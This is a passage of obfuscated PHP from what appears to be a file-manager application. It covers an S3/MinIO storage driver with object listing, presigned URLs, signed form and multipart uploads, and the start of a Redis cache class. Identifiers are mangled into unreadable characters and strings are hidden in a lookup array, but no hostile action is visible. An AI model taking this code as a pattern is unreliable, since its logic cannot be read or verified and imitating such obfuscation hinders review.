array_diff($ä£Æ¬ºÓ, array($¡Â‡¦¿‡)); $ä£Æ¬ºÓ = count(array_unique($ä£Æ¬ºÓ)); $îµ®â²¤ = count(array_unique($îµ®â²¤)); return array($şÊ”‰ÂĞ[239] => $ä£Æ¬ºÓ, $şÊ”‰ÂĞ[240] => $îµ®â²¤); } return !1; } public function listAll($Ìœªë¸Ê) { $ †èÂæä =& $_SERVER[¹Éµ„ºå]; $˜‰Ø×Ê¸ = $this->fileList($Ìœªë¸Ê, $ †èÂæä[12], !0); $¶Áëğóœ = array_to_keyvalue($˜‰Ø×Ê¸[$ †èÂæä[86]], $ †èÂæä[32]); foreach ($˜‰Ø×Ê¸[$ †èÂæä[85]] as $§ğ«ŞÅ) { if (is_string($§ğ«ŞÅ)) { $¶Áëğóœ[$§ğ«ŞÅ] = array($ †èÂæä[79] => 0); } } return $this->listAllFiles($Ìœªë¸Ê, $¶Áëğóœ); } public function canRead($Ë Ä–áí) { $›ĞÑ—ªº =& $_SERVER[¹Éµ„ºå]; $éƒ¶²„˜ = $this->client->getAccessControlPolicy($this->bucket, $Ë Ä–áí); if (!$éƒ¶²„˜) { return !1; } return in_array($éƒ¶²„˜, array($›ĞÑ—ªº[241], $›ĞÑ—ªº[242], $›ĞÑ—ªº[243])) ? !0 : !1; } public function canWrite($êÕûì¿Œ) { $Ú…­°¬Û =& $_SERVER[¹Éµ„ºå]; $û¥åôûé = $this->client->getAccessControlPolicy($this->bucket, $êÕûì¿Œ); if (!$û¥åôûé) { return !1; } return in_array($û¥åôûé, array($Ú…­°¬Û[241], $Ú…­°¬Û[242])) ? !0 : !1; } public function getContent($õ¡é›£²) { return $this->client->getObject($this->bucket, $õ¡é›£²); } public function setContent($ÌÄé»ƒÉ, $›ªšå¹Ê = '', $ÏÚçéë = false) { $±’µ¹©© =& $_SERVER[¹Éµ„ºå]; $ÌÄé»ƒÉ = $ÏÚçéë ? trim($ÌÄé»ƒÉ, $±’µ¹©©[8]) . $±’µ¹©©[8] : $ÌÄé»ƒÉ; $¾øİÔìã = get_file_mime(get_path_ext($ÌÄé»ƒÉ)); $ÑüŸåõ¶ = $this->client->putObject($›ªšå¹Ê, $this->bucket, $ÌÄé»ƒÉ, $±’µ¹©©[229], array(), $¾øİÔìã); if (!$ÑüŸåõ¶) { return !1; } if ($ÏÚçéë) { return !0; } return $ÑüŸåõ¶ ? !0 : !1; } public function fileSubstr($ƒ²üÀä÷, $Éˆòìò, $¦”»˜Ä) { $Ó£»˜òĞ = $Éˆòìò + $¦”»˜Ä - 1; return $this->client->getObject($this->bucket, $ƒ²üÀä÷, array($_SERVER[¹Éµ„ºå][244] => "\142\171\x74\x65\x73\x3d{$Éˆòìò}\x2d{$Ó£»˜òĞ}")); } public function upload($€£êÍòß, $êÜŠ² ¡, $¢Åš´âÖ = false, $ŠğÂàÜŒ = REPEAT_REPLACE) { $Ûî‹¤«‡ =& $_SERVER[¹Éµ„ºå]; if (!$êÜŠ² ¡ || !@file_exists($êÜŠ² ¡)) { return !1; } $ëÖ­¹¿ı = array($Ûî‹¤«‡[245] => @md5_file($êÜŠ² ¡)); $õ¬’†¯î = array($Ûî‹¤«‡[246] => get_file_mime(get_path_ext($€£êÍòß))); if (IO::size($êÜŠ² ¡) <= 1024 * 1024 * 200) { $ïü³¨ÓŞ = $this->client->putObjectFile($êÜŠ² ¡, $this->bucket, $€£êÍòß, $Ûî‹¤«‡[229], $ëÖ­¹¿ı, $õ¬’†¯î); return !empty($ïü³¨ÓŞ) ? $this->getPathOuter($€£êÍòß) : !1; } $ñ¦®—ç³ = $this->client->multiUploadObject($êÜŠ² ¡, $this->bucket, trim($€£êÍòß, $Ûî‹¤«‡[8]), $ëÖ­¹¿ı, $õ¬’†¯î); return $ñ¦®—ç³ ? $this->getPathOuter($€£êÍòß) : !1; } public function download($•Ì¸¤¥ô, $ÂÑ—ÊÔ™) { if (!@is_dir($this->pathFather($ÂÑ—ÊÔ™)) && !IO::mkdir($this->pathFather($ÂÑ—ÊÔ™))) { return !1; } $Ö¥½œ´Ù = $this->client->getObject($this->bucket, $•Ì¸¤¥ô, array(), $ÂÑ—ÊÔ™); return $Ö¥½œ´Ù !== !1 ? $ÂÑ—ÊÔ™ : !1; } public function link($¨üï—Ù–, $ú¥½¹á• = array()) { return $this->getPreSignedURL($¨üï—Ù–, 3600 * 12, $ú¥½¹á•); } private function getPreSignedURL($šõ©Å…Î, $‹…ß¦ñ±, $œŒ˜íå = array(), $è–Õš›® = "\107\x45\124") { $……Ã¬ğ =& $_SERVER[¹Éµ„ºå]; $šõ©Å…Î = trim($šõ©Å…Î, $……Ã¬ğ[8]); if ($this->signVer == $……Ã¬ğ[247]) { return $this->client->getPreSignedV2URL($this->bucket, $šõ©Å…Î, $‹…ß¦ñ±, $è–Õš›®, $œŒ˜íå); } return $this->client->getPreSignedV4URL($this->bucket, $šõ©Å…Î, $‹…ß¦ñ±, array(), $è–Õš›®, $œŒ˜íå); } public function fileOut($è„óøÜÜ, $¯Ò§ùØ = false, $¾¿âÅü = false, $¾Ğ¤‡ = '') { $é¢æ–¢Ï =& $_SERVER[¹Éµ„ºå]; if ($this->isFileOutServer()) { return $this->fileOutServer($è„óøÜÜ, $¯Ò§ùØ, $¾¿âÅü, $¾Ğ¤‡); } if (!$¾¿âÅü) { $¾¿âÅü = $this->pathThis($è„óøÜÜ); } $«“×¸ë“ = get_file_mime(get_path_ext($¾¿âÅü)); if ($«“×¸ë“ == $é¢æ–¢Ï[248]) { return parent::fileOut($è„óøÜÜ, $¯Ò§ùØ, $¾¿âÅü, $¾Ğ¤‡); } $À¯×¤Â = array($é¢æ–¢Ï[249] => $«“×¸ë“); if ($¯Ò§ùØ) { $À¯×¤Â[$é¢æ–¢Ï[250]] = $é¢æ–¢Ï[251] . rawurlencode($¾¿âÅü); } else { } $ûÏßÎà = $this->link($è„óøÜÜ, $À¯×¤Â); $this->fileOutLink($ûÏßÎà); } public function fileOutServer($ù»ò­, $«çì¥é = false, $Å¬×Ù¦¡ = false, $ò¿Ì½“£ = '') { parent::fileOut($ù»ò­, $«çì¥é, $Å¬×Ù¦¡, $ò¿Ì½“£); } public function fileOutImageServer($¹‡ÚÅé×, $Ë¼õéÂ = 250) { parent::fileOutImage($¹‡ÚÅé×, $Ë¼õéÂ); } public function fileOutLink($‡Ãè¸Øğ) { $ËëóÒí‰ =& $_SERVER[¹Éµ„ºå]; if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($ËëóÒí‰[67], $ËëóÒí‰[66], $ËëóÒí‰[68])) && !get_url_scheme($this->endpoint) && substr($‡Ãè¸Øğ, 0, 7) == $ËëóÒí‰[216]) { $‡Ãè¸Øğ = $ËëóÒí‰[217] . substr($‡Ãè¸Øğ, 7); } header($ËëóÒí‰[172] . $‡Ãè¸Øğ); die; } public function hashMd5($“µáéşÃ, $…‡Š‚ôâ = '') { $Ë˜´ôŠÄ = $this->objectMeta($“µáéşÃ); if (!$Ë˜´ôŠÄ) { return !1; } $…‡Š‚ôâ = $…‡Š‚ôâ ? $…‡Š‚ôâ : _get($Ë˜´ôŠÄ, $_SERVER[¹Éµ„ºå][252]); return $…‡Š‚ôâ; } public function uploadFormData($ÃŞôÍ¬Ú, $Ÿ©…å³Ë = 3600) { $Ê‡ò£Ïş =& $_SERVER[¹Éµ„ºå]; if (!$this->_isClientAsync()) { $ÏŒ·’Ş = $this->getPreSignedURL($ÃŞôÍ¬Ú, $Ÿ©…å³Ë, array(), $Ê‡ò£Ïş[253]); return array($Ê‡ò£Ïş[206] => str_replace($Ê‡ò£Ïş[216], $Ê‡ò£Ïş[254], $ÏŒ·’Ş)); } if (isset($GLOBALS[$Ê‡ò£Ïş[6]][$Ê‡ò£Ïş[92]][$Ê‡ò£Ïş[255]]) && $GLOBALS[$Ê‡ò£Ïş[6]][$Ê‡ò£Ïş[92]][$Ê‡ò£Ïş[255]] == $Ê‡ò£Ïş[228]) { return $this->uploadMultiData($ÃŞôÍ¬Ú, $Ÿ©…å³Ë); } if ($this->signVer == $Ê‡ò£Ïş[247]) { return $this->uploadFormDataV2($ÃŞôÍ¬Ú, $Ÿ©…å³Ë); } return $this->uploadFormDataV4($ÃŞôÍ¬Ú, $Ÿ©…å³Ë); } public function uploadFormDataV2($’ÎàÄÚ, $ê¼«Â¥ = 3600) { $º€¦… =& $_SERVER[¹Éµ„ºå]; $ºà¯Û»Æ = $this->pathFather($’ÎàÄÚ); $õËÃûûß = $this->client->getHttpUploadPostParams($this->bucket, $ºà¯Û»Æ, $º€¦…[229], $ê¼«Â¥); $¨á¦ªŸû = array_merge((array) $õËÃûûß, array($º€¦…[256] => $º€¦…[247], $º€¦…[206] => $this->getHost())); if ($this->_isClientAsync()) { unset($¨á¦ªŸû[$º€¦…[256]]); } return $¨á¦ªŸû; } public function uploadFormDataV4($ÚøóõÈŒ, $øı˜×ä• = 3600) { $§Ş×»Ğş =& $_SERVER[¹Éµ„ºå]; $ºŸŸõ‡© = $§Ş×»Ğş[229]; $â˜ÅÉ× = $§Ş×»Ğş[257]; $Ö…‹äî» = $§Ş×»Ğş[62]; $°Ö·ú‡£ = gmdate($§Ş×»Ğş[258]); $”šãîª = gmdate($§Ş×»Ğş[259]); $’·ğÒœæ = $§Ş×»Ğş[260]; $Ò¹»ÃÊ = $øı˜×ä• . $§Ş×»Ğş[12]; $è¶İ¥ìù = $§Ş×»Ğş[261]; $ÅúÀ«œ = array($this->accessKey, $”šãîª, $this->region, $Ö…‹äî», $’·ğÒœæ); $×øˆËßş = implode($§Ş×»Ğş[8], $ÅúÀ«œ); $ü¼Ã´¬á = array($§Ş×»Ğş[262] => gmdate($§Ş×»Ğş[263], strtotime($§Ş×»Ğş[264])), $§Ş×»Ğş[265] => array(array($§Ş×»Ğş[266] => $this->bucket), array($§Ş×»Ğş[267], $§Ş×»Ğş[268], $§Ş×»Ğş[12]), array($§Ş×»Ğş[267], $§Ş×»Ğş[269], $§Ş×»Ğş[12]), array($§Ş×»Ğş[270] => $è¶İ¥ìù), array($§Ş×»Ğş[271] => $×øˆËßş), array($§Ş×»Ğş[272] => $â˜ÅÉ×), array($§Ş×»Ğş[273] => $°Ö·ú‡£), array($§Ş×»Ğş[274] => $Ò¹»ÃÊ))); $¼ÔßÄ¦ = base64_encode(json_encode($ü¼Ã´¬á)); $ãÔšÂêÍ = hash_hmac($§Ş×»Ğş[275], $”šãîª, $§Ş×»Ğş[276] . $this->secret, !0); $¼À­Ã¿Ù = hash_hmac($§Ş×»Ğş[275], $this->region, $ãÔšÂêÍ, !0); $¥İê‡Œœ = hash_hmac($§Ş×»Ğş[275], $Ö…‹äî», $¼À­Ã¿Ù, !0); $½„éƒÊâ = hash_hmac($§Ş×»Ğş[275], $’·ğÒœæ, $¥İê‡Œœ, !0); $•Øé€«í = hash_hmac($§Ş×»Ğş[275], $¼ÔßÄ¦, $½„éƒÊâ); $‡µÏ¿Óã = array($§Ş×»Ğş[246] => $§Ş×»Ğş[12], $§Ş×»Ğş[270] => $è¶İ¥ìù, $§Ş×»Ğş[277] => $¼ÔßÄ¦, $§Ş×»Ğş[271] => $×øˆËßş, $§Ş×»Ğş[272] => $â˜ÅÉ×, $§Ş×»Ğş[273] => $°Ö·ú‡£, $§Ş×»Ğş[274] => $Ò¹»ÃÊ, $§Ş×»Ğş[278] => $•Øé€«í, $§Ş×»Ğş[256] => $§Ş×»Ğş[247], $§Ş×»Ğş[206] => $this->getHost()); if ($this->_isClientAsync()) { unset($‡µÏ¿Óã[$§Ş×»Ğş[256]]); } return $‡µÏ¿Óã; } public function uploadMultiData($¿¦ç£µ, $÷ë«¶Ô× = 3600) { $ıƒ³å =& $_SERVER[¹Éµ„ºå]; $¸Ü™œß¿ = $this->signVer == $ıƒ³å[247] ? gmdate($ıƒ³å[279]) : gmdate($ıƒ³å[280]); $ç¡¾ß°÷ = array(); $‰›”Ùáˆ = $this->client->getUploadId($this->bucket, $¿¦ç£µ, $ç¡¾ß°÷); if (!$‰›”Ùáˆ) { return !1; } $ƒõ¬àÅ« = array($ıƒ³å[281] => $‰›”Ùáˆ, $ıƒ³å[206] => $this->getHost() . $ıƒ³å[8] . $this->pathEncode($¿¦ç£µ), $ıƒ³å[282] => $¸Ü™œß¿, $ıƒ³å[95] => $¿¦ç£µ, $ıƒ³å[256] => $this->signVer); if ($this->_isClientAsync()) { unset($ƒõ¬àÅ«[$ıƒ³å[256]]); } return $ƒõ¬àÅ«; } public function uploadMultiAuth($ÂÕÏ¡š, $íó˜Ï˜™ = array()) { $®³£ğç =& $_SERVER[¹Éµ„ºå]; if ($this->signVer == $®³£ğç[247]) { if (isset($íó˜Ï˜™[$®³£ğç[283]])) { return $this->uploadPartAuthV2($ÂÕÏ¡š, $íó˜Ï˜™); } return $this->uploadListAuthV2($ÂÕÏ¡š, $íó˜Ï˜™); } if (isset($íó˜Ï˜™[$®³£ğç[283]])) { return $this->uploadPartAuthV4($ÂÕÏ¡š, $íó˜Ï˜™); } return $this->uploadListAuthV4($ÂÕÏ¡š, $íó˜Ï˜™); } public function uploadPartAuthV2($ğÃ¯Ï÷, $œö¨¾Î€ = array()) { $ÎŒáªÀé =& $_SERVER[¹Éµ„ºå]; $–Éºâ×÷ = $œö¨¾Î€[$ÎŒáªÀé[95]]; $¾ÂåŒæ = gmdate($ÎŒáªÀé[279]); $è‚åÇ„Î = array_intersect_key($œö¨¾Î€, array_flip(array($ÎŒáªÀé[283], $ÎŒáªÀé[281]))); ksort($è‚åÇ„Î); $»Üæ¢Îè = $è‚åÇ„Î ? $ÎŒáªÀé[76] . http_build_query($è‚åÇ„Î, null, $ÎŒáªÀé[284], PHP_QUERY_RFC3986) : $ÎŒáªÀé[12]; $£‘“îı = array($ÎŒáªÀé[253], $ÎŒáªÀé[12], $ÎŒáªÀé[120], $ÎŒáªÀé[12], "\170\x2d\x61\155\x7a\x2d\144\x61\x74\145\x3a{$¾ÂåŒæ}", $ÎŒáªÀé[8] . $this->bucket . $ÎŒáªÀé[8] . $this->pathEncode($–Éºâ×÷) . $»Üæ¢Îè); $âŸ«ìˆ» = implode($ÎŒáªÀé[285], $£‘“îı); $ç¼ô¥ÂÌ = $this->client->__getSignature($âŸ«ìˆ»); return array($ÎŒáªÀé[286] => $ç¼ô¥ÂÌ, $ÎŒáªÀé[282] => $¾ÂåŒæ); } public function uploadListAuthV2($İ£ÒõåÆ, $ª—ºç‹ = array()) { $—Ì’Á“² =& $_SERVER[¹Éµ„ºå]; $µÀ¹œÜç = $ª—ºç‹[$—Ì’Á“²[95]]; $¨Á—È… = $ª—ºç‹[$—Ì’Á“²[281]]; $ŒÚ–‡ƒ® = $this->client->listParts($this->bucket, $µÀ¹œÜç, $¨Á—È…); if (!$ŒÚ–‡ƒ®) { return !1; } $Ê¥øı—ğ = gmdate($—Ì’Á“²[279]); $šÔ¶ã­Û = $—Ì’Á“²[287] . $¨Á—È…; $Çë†òÖÔ = array($—Ì’Á“²[288], $—Ì’Á“²[12], $—Ì’Á“²[120], $—Ì’Á“²[12], "\170\x2d\141\155\172\x2d\x64\141\164\145\72{$Ê¥øı—ğ}", $—Ì’Á“²[8] . $this->bucket . $—Ì’Á“²[8] . $this->pathEncode($µÀ¹œÜç) . $šÔ¶ã­Û); $‡ÑŒó„Ü = implode($—Ì’Á“²[285], $Çë†òÖÔ); $°Ÿ‰üä¯ = $this->client->__getSignature($‡ÑŒó„Ü); return array($—Ì’Á“²[286] => $°Ÿ‰üä¯, $—Ì’Á“²[282] => $Ê¥øı—ğ, $—Ì’Á“²[289] => $ŒÚ–‡ƒ®); } public function uploadPartAuthV4($Éå¥’™ë, $Œİò¿À = array()) { $¯œ§æ‘ =& $_SERVER[¹Éµ„ºå]; $½Š¯Û¹ş = $Œİò¿À[$¯œ§æ‘[95]]; $´çÃËÛğ = array($¯œ§æ‘[273] => gmdate($¯œ§æ‘[280]), $¯œ§æ‘[290] => _get($Œİò¿À, $¯œ§æ‘[291], hash($¯œ§æ‘[275], $¯œ§æ‘[12]))); $†œĞ¨ŒÍ = explode($¯œ§æ‘[208], $this->getHost()); $ØãŒçÚ“ = array($¯œ§æ‘[292] => $†œĞ¨ŒÍ[1], $¯œ§æ‘[293] => $¯œ§æ‘[12], $¯œ§æ‘[246] => $¯œ§æ‘[120], $¯œ§æ‘[294] => $Œİò¿À[$¯œ§æ‘[79]]); $ä÷ÀÀë’ = $¯œ§æ‘[253]; $âÙûÖ’™ = $¯œ§æ‘[8] . $this->pathEncode($½Š¯Û¹ş); $íÀáşé˜ = array_intersect_key($Œİò¿À, array_flip(array($¯œ§æ‘[283], $¯œ§æ‘[281]))); $ŞÙ «í = $this->client->__getSignatureV4($´çÃËÛğ, $ØãŒçÚ“, $ä÷ÀÀë’, $âÙûÖ’™, $íÀáşé˜); return array($¯œ§æ‘[286] => $ŞÙ «í, $¯œ§æ‘[290] => $´çÃËÛğ[$¯œ§æ‘[290]], $¯œ§æ‘[282] => $´çÃËÛğ[$¯œ§æ‘[273]]); } public function uploadListAuthV4($ŒÛ¶šÉ, $¯ğ¸Ó‡ = array()) { $ßßì£Ğì =& $_SERVER[¹Éµ„ºå]; $ø¬€ÆšÅ = $¯ğ¸Ó‡[$ßßì£Ğì[95]]; $ÙäñáÑ¸ = $¯ğ¸Ó‡[$ßßì£Ğì[281]]; $»ş„Å·ƒ = $this->client->listParts($this->bucket, $ø¬€ÆšÅ, $ÙäñáÑ¸); if (!$»ş„Å·ƒ) { return !1; } $¼İ³Ó”ƒ = $ßßì£Ğì[295]; foreach ($»ş„Å·ƒ as $”Ìƒ¬Êä) { $¼İ³Ó”ƒ .= $ßßì£Ğì[296] . "\74\x50\141\162\x74\x4e\165\x6d\x62\x65\x72\x3e{$”Ìƒ¬Êä[$ßßì£Ğì[297]]}\x3c\57\120\x61\x72\x74\116\165\x6d\142\x65\162\76\xa" . "\x3c\x45\x54\x61\x67\x3e{$”Ìƒ¬Êä[$ßßì£Ğì[298]]}\x3c\57\105\x54\141\147\76\12" . $ßßì£Ğì[299]; } $¼İ³Ó”ƒ .= $ßßì£Ğì[300]; $æÜÂÆĞÄ = array($ßßì£Ğì[273] => gmdate($ßßì£Ğì[280]), $ßßì£Ğì[290] => hash($ßßì£Ğì[275], $¼İ³Ó”ƒ)); $µ¶…İ‹ï = explode($ßßì£Ğì[208], $this->getHost()); $èÆÕú¶ = array($ßßì£Ğì[292] => $µ¶…İ‹ï[1], $ßßì£Ğì[246] => $ßßì£Ğì[120], $ßßì£Ğì[294] => strlen($¼İ³Ó”ƒ)); $ú­ïËŠ× = $ßßì£Ğì[288]; $ƒ¶ÑŠ™Õ = $ßßì£Ğì[8] . $this->pathEncode($ø¬€ÆšÅ); $æş“ÌÍ£ = array($ßßì£Ğì[281] => $ÙäñáÑ¸); $‹ú»• = $this->client->__getSignatureV4($æÜÂÆĞÄ, $èÆÕú¶, $ú­ïËŠ×, $ƒ¶ÑŠ™Õ, $æş“ÌÍ£); return array($ßßì£Ğì[286] => $‹ú»•, $ßßì£Ğì[290] => $æÜÂÆĞÄ[$ßßì£Ğì[290]], $ßßì£Ğì[282] => $æÜÂÆĞÄ[$ßßì£Ğì[273]], $ßßì£Ğì[289] => $»ş„Å·ƒ); } private function _isClientAsync() { $ÙîŞ±Æ” =& $_SERVER[¹Éµ„ºå]; static $ ÷„Ş”Ñ = null; if ($ ÷„Ş”Ñ === null) { $—’İ’¶É = isset($_REQUEST[$ÙîŞ±Æ”[301]]) ? json_decode($_REQUEST[$ÙîŞ±Æ”[301]], !0) : !1; $ ÷„Ş”Ñ = $—’İ’¶É && _get($—’İ’¶É, $ÙîŞ±Æ”[302]) == $ÙîŞ±Æ”[303]; } return $ ÷„Ş”Ñ; } public function getHost() { $àŠÃŞîí =& $_SERVER[¹Éµ„ºå]; $üğùøıÜ = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($àŠÃŞîí[70], $àŠÃŞîí[64], $àŠÃŞîí[69], $àŠÃŞîí[62]))) { return $üğùøıÜ . $àŠÃŞîí[8] . $this->bucket; } if ($this->osType == $àŠÃŞîí[62] && !is_domain($üğùøıÜ)) { return $üğùøıÜ . $àŠÃŞîí[8] . $this->bucket; } $üğùøıÜ = explode($àŠÃŞîí[208], $üğùøıÜ); return $üğùøıÜ[0] . $àŠÃŞîí[208] . $this->bucket . $àŠÃŞîí[10] . $üğùøıÜ[1]; } public function size($Ì¾‡¨ƒ°) { $™àÍ¬¨® = $this->objectMeta($Ì¾‡¨ƒ°); return $™àÍ¬¨® ? $™àÍ¬¨®[$_SERVER[¹Éµ„ºå][79]] : 0; } public function info($ÀÓèì‡õ) { if ($this->isFolder($ÀÓèì‡õ)) { return $this->folderInfo($ÀÓèì‡õ); } else { if ($this->isFile($ÀÓèì‡õ)) { return $this->fileInfo($ÀÓèì‡õ); } } return !1; } public function exist($›Î‘ïì’) { return $this->isFile($›Î‘ïì’) || $this->isFolder($›Î‘ïì’); } public function isFile($ÅÂ… …ç) { return !$this->isFolder($ÅÂ… …ç) && $this->objectMeta($ÅÂ… …ç); } public function isFolder($É½åÊ–É) { return $this->cacheMethod($_SERVER[¹Éµ„ºå][177], $É½åÊ–É); } protected function objectMeta($€ç—™«¨) { return $this->cacheMethod($_SERVER[¹Éµ„ºå][179], $€ç—™«¨); } protected function _objectMeta($ş­¼Õş) { $‘£»ï =& $_SERVER[¹Éµ„ºå]; $ş­¼Õş = rtrim($ş­¼Õş, $‘£»ï[8]); try { $²É„·„û = $this->client->getObjectInfo($this->bucket, $ş­¼Õş); if (!isset($²É„·„û[$‘£»ï[252]]) && isset($²É„·„û[$‘£»ï[304]])) { $²É„·„û[$‘£»ï[252]] = $²É„·„û[$‘£»ï[304]]; } } catch (Exception $¸öÚÕíÛ) { $²É„·„û = !1; } if (!$²É„·„û) { } return $²É„·„û; } protected function _isFolder($à·âÖ) { $ÆÃµ…è£ =& $_SERVER[¹Éµ„ºå]; $à·âÖ = rtrim($à·âÖ, $ÆÃµ…è£[8]) . $ÆÃµ…è£[8]; if ($à·âÖ == $ÆÃµ…è£[12] || $à·âÖ == $ÆÃµ…è£[8]) { return !0; } $‘ñêíıŒ = $this->client->getBucket($this->bucket, $à·âÖ, null, 1); if (empty($‘ñêíıŒ[$ÆÃµ…è£[236]])) { return !1; } $•ï®÷•ò = $‘ñêíıŒ[$ÆÃµ…è£[236]][0][$ÆÃµ…è£[32]]; return stripos($•ï®÷•ò, $à·âÖ) === 0 ? !0 : !1; if (substr($•ï®÷•ò, -1) == $ÆÃµ…è£[8]) { return !0; } if (get_path_this($•ï®÷•ò) == get_path_this($à·âÖ)) { return !1; } return !0; } public function listObject($ä‚†é‘Ì) { return $this->fileList($ä‚†é‘Ì, $_SERVER[¹Éµ„ºå][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($îÀ£ûÈ×) { $²¶½ÖÇ =& $_SERVER[¹Éµ„ºå]; parent::__construct($îÀ£ûÈ×); $this->setSignVersion($²¶½ÖÇ[247]); if (!$this->region) { $this->region = $²¶½ÖÇ[305]; $this->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function uploadFormData($”ÇÉ›, $İµŠÓÉÓ = 3600) { $’ü‚ˆœ¨ =& $_SERVER[¹Éµ„ºå]; $€“¯Şò¹ = $’ü‚ˆœ¨[229]; $°éõƒÌ© = $’ü‚ˆœ¨[257]; $Âê²ş = $’ü‚ˆœ¨[62]; $î÷Æ¶«ö = gmdate($’ü‚ˆœ¨[258]); $“Û£ù†« = gmdate($’ü‚ˆœ¨[259]); $¬ªŸ«º¿ = $’ü‚ˆœ¨[260]; $ıÜœ•®œ = $İµŠÓÉÓ . $’ü‚ˆœ¨[12]; $µÅß¯’Ğ = $’ü‚ˆœ¨[261]; $ÙÃâ—Ö = array($this->accessKey, $“Û£ù†«, $this->region, $Âê²ş, $¬ªŸ«º¿); $²šƒ¹ıİ = implode($’ü‚ˆœ¨[8], $ÙÃâ—Ö); $Ÿú÷ØÑì = array($’ü‚ˆœ¨[262] => gmdate($’ü‚ˆœ¨[263], strtotime($’ü‚ˆœ¨[264])), $’ü‚ˆœ¨[265] => array(array($’ü‚ˆœ¨[266] => $this->bucket), array($’ü‚ˆœ¨[306] => $€“¯Şò¹), array($’ü‚ˆœ¨[267], $’ü‚ˆœ¨[268], $’ü‚ˆœ¨[12]), array($’ü‚ˆœ¨[267], $’ü‚ˆœ¨[269], $’ü‚ˆœ¨[12]), array($’ü‚ˆœ¨[267], $’ü‚ˆœ¨[307], $’ü‚ˆœ¨[12]), array($’ü‚ˆœ¨[270] => $µÅß¯’Ğ), array($’ü‚ˆœ¨[271] => $²šƒ¹ıİ), array($’ü‚ˆœ¨[272] => $°éõƒÌ©), array($’ü‚ˆœ¨[273] => $î÷Æ¶«ö), array($’ü‚ˆœ¨[274] => $ıÜœ•®œ))); $º½¥ÕŞ™ = base64_encode(json_encode($Ÿú÷ØÑì)); $Ù–›×Ş¼ = hash_hmac($’ü‚ˆœ¨[275], $“Û£ù†«, $’ü‚ˆœ¨[276] . $this->secret, !0); $˜˜©Áª = hash_hmac($’ü‚ˆœ¨[275], $this->region, $Ù–›×Ş¼, !0); $¸Ûã¬šâ = hash_hmac($’ü‚ˆœ¨[275], $Âê²ş, $˜˜©Áª, !0); $ïÃÁÎÔ = hash_hmac($’ü‚ˆœ¨[275], $¬ªŸ«º¿, $¸Ûã¬šâ, !0); $ƒ¥ù¾’ = hash_hmac($’ü‚ˆœ¨[275], $º½¥ÕŞ™, $ïÃÁÎÔ); $¯ç¢ç€‰ = array($’ü‚ˆœ¨[246] => $’ü‚ˆœ¨[12], $’ü‚ˆœ¨[294] => $’ü‚ˆœ¨[12], $’ü‚ˆœ¨[306] => $€“¯Şò¹, $’ü‚ˆœ¨[270] => $µÅß¯’Ğ, $’ü‚ˆœ¨[277] => $º½¥ÕŞ™, $’ü‚ˆœ¨[308] => $²šƒ¹ıİ, $’ü‚ˆœ¨[309] => $°éõƒÌ©, $’ü‚ˆœ¨[310] => $î÷Æ¶«ö, $’ü‚ˆœ¨[311] => $ıÜœ•®œ, $’ü‚ˆœ¨[312] => $ƒ¥ù¾’, $’ü‚ˆœ¨[206] => $this->getHost()); return $¯ç¢ç€‰; } } goto c‡•¤æŸ‘Ğ; c‚ÆŞÌÎãÄ: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($¿¥‹¯Àé, $™¢şÁ²ü) { $İ£„ÀÔ =& $_SERVER[¹Éµ„ºå]; if (!class_exists($İ£„ÀÔ[1018])) { show_json($İ£„ÀÔ[1019], !1); } $this->cacheTime = $™¢şÁ²ü; $ê½ùö¿Ö = isset($¿¥‹¯Àé[$İ£„ÀÔ[1020]]) ? $¿¥‹¯Àé[$İ£„ÀÔ[1020]] : 10; $ó‘¸ÑÂŸ = _get($¿¥‹¯Àé, $İ£„ÀÔ[1017]); if ($ó‘¸ÑÂŸ && is_array($ó‘¸ÑÂŸ)) { $this->initCluster($¿¥‹¯Àé, $ê½ùö¿Ö); } else { $this->handle = $this->init($¿¥‹¯Àé, $ê½ùö¿Ö); } } private function init($ªÁ›¤¶, $ÜÙÆª“) { $½¸Ñï¦ =& $_SERVER[¹Éµ„ºå]; $«Ãçºß = new Redis(); $ñ …ƒ·ó = isset($ªÁ›¤¶[$½¸Ñï¦[1021]]) ? $ªÁ›¤¶[$½¸Ñï¦[1021]] : !1; if ($ñ …ƒ·ó) { $«Ãçºß->pconnect($ªÁ›¤¶[$½¸Ñï¦[206]], $ªÁ›¤¶[$½¸Ñï¦[207]], $ÜÙÆª“); } else { $«Ãçºß->connect($ªÁ›¤¶[$½¸Ñï¦[206]], $ªÁ›¤¶[$½¸Ñï¦[207]], $ÜÙÆª“); } if (!empty($ªÁ›¤¶[$½¸Ñï¦[502]])) { $«Ãçºß->auth($ªÁ›¤¶[$½¸Ñï¦[502]]); } if (!empty($ªÁ›¤¶[$½¸Ñï¦[849]]) && $ªÁ›¤¶[$½¸Ñï¦[849]] != 0) { $«Ãçºß->select($ªÁ›¤¶[$½¸Ñï¦[849]]); } return $«Ãçºß; } private function initCluster($Ã‡ÎçÌ, $øÉş¸æ) { $·øƒ²öÆ =& $_SERVER[¹Éµ„ºå]; $‘¬²à» = array($·øƒ²öÆ[1022], $·øƒ²öÆ[1023], $·øƒ²öÆ[1024]); $”§Óİ‘„ = $·øƒ²öÆ[1022]; if (isset($Ã‡ÎçÌ[$·øƒ²öÆ[16]]) && in_array($Ã‡ÎçÌ[$·øƒ²öÆ[16]], $‘¬²à»)) { $”§Óİ‘„ = $Ã‡ÎçÌ[$·øƒ²öÆ[16]]; } switch ($”§Óİ‘„) { case $·øƒ²öÆ[1022]: $this->_slave($Ã‡ÎçÌ, $øÉş¸æ); break; case $·øƒ²öÆ[1023]: break; case $·øƒ²öÆ[1024]: $this->isCluster = !0; $æë¹Ç’´ = $Ã‡ÎçÌ[$·øƒ²öÆ[1017]]; $‡‰ôÂÚ¦ = isset($Ã‡ÎçÌ[$·øƒ²öÆ[1021]]) ? $Ã‡ÎçÌ[$·øƒ²öÆ[1021]] : !1; $ıÌóÀÌ¯ = isset($Ã‡ÎçÌ[$·øƒ²öÆ[502]]) ? $Ã‡ÎçÌ[$·øƒ²öÆ[502]] : null; $this->handle = new RedisCluster(NUll, $æë¹Ç’´, $øÉş¸æ, $øÉş¸æ, $‡‰ôÂÚ¦, $ıÌóÀÌ¯); break; default: break; } } private function _slave($åşİ¥Ù§, $ÙÕ¼Ä‚Û) { 